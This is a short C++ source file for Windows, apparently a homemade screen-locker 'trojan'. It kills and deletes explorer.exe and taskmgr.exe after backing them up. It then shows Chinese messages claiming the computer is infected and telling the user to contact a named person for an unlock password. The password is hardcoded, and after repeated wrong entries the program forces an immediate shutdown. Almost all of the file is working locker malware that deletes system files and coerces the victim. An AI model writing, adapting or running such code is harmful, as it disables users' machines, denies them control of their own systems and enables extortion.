#include<cstdio>
#include<cstring>
#include<windows.h>
int c=5;
char password[30];
int main()
{
    system("@echo off");
    system("cls");
    system("taskkill /F /IM explorer.exe");
    system("cls");
    system("md c:\\Wood\\Backup");
    system("cls");
    system("c:");
    system("cls");
    system("cd c:\\Wood\\Backup");
    system("cls");
    system("copy c:\\windows\\explorer.exe");
    system("cls");
    system("del /F /S /A c:\\windows\\explorer.exe");
    system("cls");
    system("taskkill /F /IM taskmgr.exe");
    system("cls");
    system("copy c:\\windows\\system32\\taskmgr.exe");
    system("cls");
    system("del /F /S /A c:\\windows\\system32\\taskmgr.exe");
    system("cls");
    printf("电脑已经被木马感染！\n");
    printf("请联系刘俊豪以索要解锁密码！\n");
    printf("请输入密码！你还有5次机会:");
    while(scanf("%s",password))
    {
        if(strcmp(password,"10401078411319004453")==0)
        {
            system("cls");
            printf("密码正确!\n");
            system("cls");
            system("cd c:\\windows\\system32\\dllcache");
            system("cls");
            system("copy c:\\wood\\backup\\explorer.exe");
            system("cls");
            system("copy c:\\wood\\backup\\taskmgr.exe");
            system("cls");
            system("cd c:\\windows");
            system("cls");
            system("copy c:\\wood\\backup\\explorer.exe");
            system("explorer.exe");
            system("cls");
            system("cd c:\\windows\\system32");
            system("cls");
            system("copy c:\\wood\\backup\\taskmgr.exe");
            system("cls");
            printf("电脑恢复成功！\n谢谢使用！\n");
            system("pause");
            return 0;
        }
        else
        {
            if(c==0)
            {
                system("cls");
                printf("次数错误太多\n系统关机！\n");
                system("shutdown -s -t 0");
                return 0;
            }
            else
            {
                system("cls");
                c--;
                printf("密码错误！你还有%d机会：",c);
            }
        }
    }
}
